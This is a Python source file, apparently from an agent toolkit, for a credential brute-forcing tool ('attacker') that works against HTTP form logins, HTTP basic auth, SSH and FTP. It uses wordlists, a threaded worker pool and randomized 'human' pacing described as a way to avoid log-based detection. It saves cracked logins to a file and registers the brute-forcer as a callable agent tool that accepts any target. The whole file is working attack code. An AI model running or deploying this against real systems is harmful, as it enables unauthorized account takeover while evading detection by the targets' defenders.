"""Network credential brute — the owner's attacker.py, in the repo.

Multi-protocol login brute for security testing:

- HTTP form POST  (custom user/pass field names, failure-string detection)
- HTTP basic auth (any method/path)
- SSH             (paramiko — optional dependency, graceful when absent)
- FTP             (stdlib ftplib)

Behaviour, from the spec:
  * configurable worker pool
  * rate limit (max attempts/second, enforced by a global slot gate)
  * configurable per-attempt delay + jitter + occasional long "human"
    pauses — simulates realistic attack pace, avoids hammering the
    target or tripping log-based tripwires
  * timestamped, colour-coded output (auto-disabled off a TTY / NO_COLOR)
  * found credentials saved to a file (and returned in the result)

Authorization is the operator's: this is standard security-testing
tooling (the same class as hydra/medusa).  Point it at systems you own
or have explicit written permission to test — the same line the spec
itself carries.  The tool takes whatever target the operator gives it.
"""
from __future__ import annotations

import ftplib
import http.client
import random
import socket
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional

from ..core.errors import ToolError
from ..core.logging_setup import get_logger
from ..core.policy import Capability

_log = get_logger(__name__)

__all__ = ["Attacker", "AttackResult", "CredentialResult", "run_attack",
           "register"]

# ── output cosmetics ─────────────────────────────────────────────────────────

_COLORS = {"ok": "\x1b[92m", "fail": "\x1b[90m", "info": "\x1b[96m",
           "warn": "\x1b[93m", "reset": "\x1b[0m"}


def _use_color() -> bool:
    import os
    if os.environ.get("NO_COLOR"):
        return False
    try:
        return __import__("sys").stdout.isatty()
    except Exception:  # noqa: BLE001
        return False


def _paint(text: str, color: str) -> str:
    if not _use_color():
        return text
    return f"{_COLORS.get(color, '')}{text}{_COLORS['reset']}"


def _ts() -> str:
    return time.strftime("%H:%M:%S")


# ── results ──────────────────────────────────────────────────────────────────


@dataclass
class CredentialResult:
    protocol: str
    host: str
    port: int
    login: str
    password: str
    evidence: str = ""
    found_at: float = field(default_factory=time.time)

    def line(self) -> str:
        return (f"[{_ts()}] {_paint('SUCCESS', 'ok')} "
                f"{self.protocol} {self.host}:{self.port} "
                f"login={self.login!r} password={self.password!r} "
                f"{self.evidence}")

    def plain_line(self) -> str:
        return (f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] SUCCESS "
                f"{self.protocol} {self.host}:{self.port} "
                f"login={self.login!r} password={self.password!r} "
                f"{self.evidence}")


@dataclass
class AttackResult:
    host: str
    port: int
    protocol: str
    attempts: int = 0
    errors: int = 0
    seconds: float = 0.0
    found: list[CredentialResult] = field(default_factory=list)
    out_file: str = ""
    note: str = ""

    def as_dict(self) -> dict[str, Any]:
        return {
            "host": self.host, "port": self.port, "protocol": self.protocol,
            "attempts": self.attempts, "errors": self.errors,
            "seconds": round(self.seconds, 2),
            "found": [{"login": f.login, "password": f.password,
                       "evidence": f.evidence, "found_at": f.found_at}
                      for f in self.found],
            "out_file": self.out_file, "note": self.note,
        }


# ── the gate: rate limit + pacing ────────────────────────────────────────────


class _PaceGate:
    """Global slot gate: caps attempts/second and adds human-ish pacing.

    Every attempt takes a slot at least 1/rate seconds apart; after the
    attempt itself, the worker sleeps base_delay ± jitter, with an
    occasional longer pause (5% of attempts) — a person on a keyboard,
    not a hammer.
    """

    def __init__(self, rate: float, delay: float, jitter: float,
                 quiet: bool = True) -> None:
        self.slot_interval = 1.0 / max(0.1, rate)
        self.delay = max(0.0, delay)
        self.jitter = max(0.0, jitter)
        self.quiet = quiet
        self._lock = threading.Lock()
        self._next_slot = time.monotonic()
        self.attempts = 0

    def take_slot(self) -> None:
        with self._lock:
            now = time.monotonic()
            wait = self._next_slot - now
            self._next_slot = max(now, self._next_slot) + self.slot_interval
        if wait > 0:
            time.sleep(wait)

    def post(self) -> None:
        self.attempts += 1
        if not self.quiet:
            pause = self.delay + random.uniform(0, self.jitter)
            if random.random() < 0.05:          # the human blinks
                pause += random.uniform(2.0, 5.0)
            if pause > 0:
                time.sleep(pause)


# ── protocol checkers ────────────────────────────────────────────────────────
# Each returns True when the credential WORKS, False on auth failure,
# and raises on transport error (the caller counts it, keeps going).


def _http_check(method: str, host: str, port: int, path: str,
                login: str, password: str, *, basic: bool,
                form_user: str, form_pass: str, fail_string: str,
                timeout: float) -> tuple[bool, str]:
    if port == 443:
        conn = http.client.HTTPSConnection(host, port, timeout=timeout)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        headers = {"User-Agent": "Mozilla/5.0 (security-test)"}
        body = None
        if basic:
            import base64
            token = base64.b64encode(
                f"{login}:{password}".encode("utf-8")).decode("ascii")
            headers["Authorization"] = f"Basic {token}"
        else:
            body = urllib.parse.urlencode(
                {form_user: login, form_pass: password}).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        text = resp.read(20_000).decode("utf-8", "replace")
        status = resp.status
    finally:
        conn.close()

    if fail_string:
        ok = fail_string.lower() not in text.lower() and status < 400
        evidence = f"http {status}" + (
            "" if ok else f" (contains fail string)")
    elif basic:
        ok = status not in (401, 403)
        evidence = f"http {status}"
    else:
        ok = status in (200, 301, 302, 303)
        evidence = f"http {status}"
    return ok, evidence


def _ftp_check(host: str, port: int, login: str, password: str,
               timeout: float) -> tuple[bool, str]:
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=timeout)
        try:
            # login() returns the 230 message; auth failure raises an
            # ftplib.Error instance carrying the 530 code+message
            ftp.login(login, password)
            return True, "ftp 230 logged in"
        except ftplib.Error as exc:
            return False, f"ftp {str(exc)[:60]}"
    finally:
        try:
            ftp.quit()
        except Exception:  # noqa: BLE001
            try:
                ftp.close()
            except Exception:  # noqa: BLE001
                pass


def _ssh_check(host: str, port: int, login: str, password: str,
               timeout: float) -> tuple[bool, str]:
    try:
        import paramiko
    except ImportError as exc:
        raise ToolError(
            "SSH brute needs paramiko: python -m pip install paramiko") from exc
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=login, password=password,
                       look_for_keys=False, allow_agent=False,
                       timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout)
        return True, "ssh authenticated"
    except paramiko.AuthenticationException:
        return False, "ssh auth refused"
    finally:
        client.close()


# ── the attacker ─────────────────────────────────────────────────────────────


class Attacker:
    """Threaded credential brute with rate limit + human pacing."""

    def __init__(
        self,
        host: str,
        *,
        port: int = 0,
        protocol: str = "http_form",
        usernames: Optional[list[str]] = None,
        passwords: Optional[list[str]] = None,
        wordlist: str = "",
        path: str = "/",
        method: str = "POST",
        basic: bool = False,
        form_user: str = "username",
        form_pass: str = "password",
        fail_string: str = "",
        workers: int = 8,
        rate: float = 10.0,          # max attempts/second (global)
        delay: float = 0.2,          # seconds between attempts (per worker)
        jitter: float = 0.5,         # ±random on top of delay
        timeout: float = 10.0,
        max_attempts: int = 20_000,
        out_file: str = "",
        quiet: bool = False,
        ssh_connect: Optional[Callable[..., tuple[bool, str]]] = None,
    ) -> None:
        host = (host or "").strip()
        if not host:
            raise ToolError("attacker needs a host")
        self.host = host
        self.protocol = (protocol or "http_form").lower().replace("-", "_")
        if self.protocol not in {"http_form", "http_basic", "ssh", "ftp"}:
            raise ToolError(
                f"unknown protocol {protocol!r} — http_form|http_basic|ssh|ftp")
        defaults = {"http_form": 80, "http_basic": 80, "ssh": 22, "ftp": 21}
        self.port = int(port or defaults[self.protocol])
        self.usernames = [u.strip() for u in (usernames or []) if u.strip()]
        if not self.usernames:
            raise ToolError("attacker needs at least one username")
        self.passwords = [p for p in (passwords or []) if p is not None]
        if wordlist:
            self.passwords += self._load_wordlist(wordlist)
        if not self.passwords:
            raise ToolError("attacker needs a wordlist or passwords")
        self.path = path or "/"
        self.method = (method or "POST").upper()
        self.basic = basic or self.protocol == "http_basic"
        self.form_user = form_user or "username"
        self.form_pass = form_pass or "password"
        self.fail_string = fail_string or ""
        self.workers = max(1, min(int(workers), 64))
        self.rate = max(0.1, float(rate))
        self.delay = float(delay)
        self.jitter = float(jitter)
        self.timeout = float(timeout)
        self.max_attempts = max(1, int(max_attempts))
        self.out_file = out_file or ""
        self.quiet = quiet
        self._ssh_connect = ssh_connect or _ssh_check
        self._gate = _PaceGate(self.rate, self.delay, self.jitter, quiet=True)
        self._queue: list[tuple[str, str]] = []
        for u in self.usernames:
            for p in self.passwords:
                self._queue.append((u, p))
        self._lock = threading.Lock()
        self._found: list[CredentialResult] = []
        self._attempts = 0
        self._errors = 0
        self._stop = threading.Event()

    @staticmethod
    def _load_wordlist(path: str) -> list[str]:
        try:
            fp = Path(path)
            if not fp.is_absolute():
                fp = Path.cwd() / fp
            if not fp.is_file():
                raise ToolError(f"wordlist not found: {path}")
            lines = fp.read_text(encoding="utf-8", errors="replace").splitlines()
        except ToolError:
            raise
        except OSError as exc:
            raise ToolError(f"wordlist unreadable: {exc}") from exc
        out = [ln.strip() for ln in lines
               if ln.strip() and not ln.lstrip().startswith("#")]
        # de-dup, keep order
        seen: set[str] = set()
        dedup = []
        for w in out:
            if w not in seen:
                seen.add(w)
                dedup.append(w)
        return dedup

    def _check_one(self, login: str, password: str) -> tuple[bool, str]:
        if self.protocol == "ssh":
            return self._ssh_connect(self.host, self.port, login, password,
                                     self.timeout)
        if self.protocol == "ftp":
            return _ftp_check(self.host, self.port, login, password,
                              self.timeout)
        return _http_check(
            self.method, self.host, self.port, self.path, login, password,
            basic=self.basic, form_user=self.form_user, form_pass=self.form_pass,
            fail_string=self.fail_string, timeout=self.timeout)

    def _worker(self) -> None:
        while not self._stop.is_set():
            item: tuple[str, str] | None = None
            with self._lock:
                if self._queue and self._attempts < self.max_attempts:
                    item = self._queue.pop(0)
                    self._attempts += 1
            if item is None:
                return
            login, password = item
            self._gate.take_slot()
            try:
                ok, evidence = self._check_one(login, password)
            except ToolError:
                # fatal for this protocol (e.g. paramiko missing)
                self._stop.set()
                with self._lock:
                    self._errors += 1
                return
            except (socket.timeout, socket.gaierror, ConnectionError,
                    OSError, EOFError, ftplib.Error,
                    http.client.HTTPException) as exc:
                with self._lock:
                    self._errors += 1
                if not self.quiet:
                    print(_paint(
                        f"[{_ts()}] error {self.host}:{self.port} "
                        f"{type(exc).__name__}: {str(exc)[:80]}", "warn"))
                self._gate.post()
                continue
            self._gate.post()
            if ok:
                result = CredentialResult(
                    protocol=self.protocol, host=self.host, port=self.port,
                    login=login, password=password, evidence=evidence)
                with self._lock:
                    self._found.append(result)
                if not self.quiet:
                    print(_paint(result.line(), "ok"))
                self._save_line(result)
                if self._found:
                    # one hit: stop hammering, report
                    self._stop.set()
                    return
            elif not self.quiet:
                print(_paint(
                    f"[{_ts()}] {self.protocol} {self.host}:{self.port} "
                    f"{login}:{password} — {evidence}", "fail"))

    def _save_line(self, result: CredentialResult) -> None:
        if not self.out_file:
            return
        try:
            Path(self.out_file).parent.mkdir(parents=True, exist_ok=True)
            with open(self.out_file, "a", encoding="utf-8") as f:
                f.write(result.plain_line() + "\n")
        except OSError as exc:
            _log.warning("could not save credentials file: %s", exc)

    def run(self) -> AttackResult:
        if self._queue and not self.quiet:
            print(_paint(
                f"[{_ts()}] {self.protocol} {self.host}:{self.port} — "
                f"{len(self._queue)} attempts, {self.workers} workers, "
                f"≤{self.rate:g}/s, delay {self.delay:g}s±{self.jitter:g}s",
                "info"))
        started = time.monotonic()
        threads = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.timeout + 30)
        seconds = time.monotonic() - started
        result = AttackResult(
            host=self.host, port=self.port, protocol=self.protocol,
            attempts=self._attempts, errors=self._errors, seconds=seconds,
            found=list(self._found), out_file=self.out_file)
        if self._attempts == 0:
            result.note = "nothing to do (empty credential space)"
        if self._errors and not self._found:
            result.note = (f"{self._errors} transport error(s) — "
                           "check host/port reachability")
        elif not self._found:
            result.note = "no valid credentials in the given space"
        return result


def run_attack(
    host: str,
    *,
    port: int = 0,
    protocol: str = "http_form",
    usernames: str = "",
    passwords: str = "",
    wordlist: str = "",
    path: str = "/",
    method: str = "POST",
    basic: bool = False,
    form_user: str = "username",
    form_pass: str = "password",
    fail_string: str = "",
    workers: int = 8,
    rate: float = 10.0,
    delay: float = 0.2,
    jitter: float = 0.5,
    timeout: float = 10.0,
    max_attempts: int = 20_000,
    out_file: str = "",
) -> dict[str, Any]:
    """Functional entry point (CLI + registry share this)."""
    users = [u.strip() for u in usernames.replace(";", ",").split(",")]
    pws = [p.strip() for p in passwords.replace(";", ",").split(",")
           if p.strip()]
    attacker = Attacker(
        host, port=int(port or 0), protocol=protocol,
        usernames=users, passwords=pws, wordlist=wordlist, path=path,
        method=method, basic=basic, form_user=form_user, form_pass=form_pass,
        fail_string=fail_string, workers=workers, rate=rate, delay=delay,
        jitter=jitter, timeout=timeout, max_attempts=max_attempts,
        out_file=out_file,
    )
    return attacker.run().as_dict()


# ── registry ─────────────────────────────────────────────────────────────────


def register(registry: Any) -> None:
    context = registry.context

    @registry.register(
        "attacker",
        description=(
            "Network credential brute for security testing: http_form "
            "(custom fields + fail string), http_basic, ssh (paramiko), ftp. "
            "Threaded worker pool, global rate limit, human-paced delays, "
            "found credentials saved to a file. For systems you own or have "
            "explicit written permission to test."
        ),
        capability=Capability.NET_OUT,
        parameters={
            "host": "str — target host/IP (operator-specified)",
            "port": "int (optional, per-protocol default 80/80/22/21)",
            "protocol": "str — http_form | http_basic | ssh | ftp",
            "usernames": "str — comma list of logins to try",
            "passwords": "str (optional) — comma list of inline passwords",
            "wordlist": "str (optional) — path to a password file",
            "path": "str (http) — login path, default /",
            "method": "str (http) — POST | GET, default POST",
            "form_user": "str (http_form) — user field name",
            "form_pass": "str (http_form) — password field name",
            "fail_string": "str (http_form) — text that marks a failed login",
            "workers": "int (optional, 8, max 64)",
            "rate": "float (optional, 10) — max attempts/second",
            "delay": "float (optional, 0.2) — seconds between attempts",
            "jitter": "float (optional, 0.5) — random delay spread",
            "timeout": "float (optional, 10) — per-attempt seconds",
            "max_attempts": "int (optional, 20000)",
            "out_file": "str (optional) — save found credentials here",
        },
    )
    def attacker(
        host: str,
        *,
        port: str = "",
        protocol: str = "http_form",
        usernames: str = "",
        passwords: str = "",
        wordlist: str = "",
        path: str = "/",
        method: str = "POST",
        form_user: str = "username",
        form_pass: str = "password",
        fail_string: str = "",
        workers: str = "",
        rate: str = "",
        delay: str = "",
        jitter: str = "",
        timeout: str = "",
        max_attempts: str = "",
        out_file: str = "",
    ) -> dict[str, Any]:
        def f(key: str, default: float) -> float:
            try:
                return float(key) if str(key).strip() else default
            except ValueError:
                return default

        wl = wordlist
        if wl and context is not None and not Path(wl).is_absolute():
            from .filesystem import safe_path

            wl = str(safe_path(context, wl))
        return run_attack(
            host, port=int(f(port, 0)), protocol=protocol,
            usernames=usernames, passwords=passwords, wordlist=wl,
            path=path, method=method, basic=False,
            form_user=form_user, form_pass=form_pass,
            fail_string=fail_string, workers=int(f(workers, 8)),
            rate=f(rate, 10.0), delay=f(delay, 0.2), jitter=f(jitter, 0.5),
            timeout=f(timeout, 10.0), max_attempts=int(f(max_attempts, 20000)),
            out_file=out_file,
        )
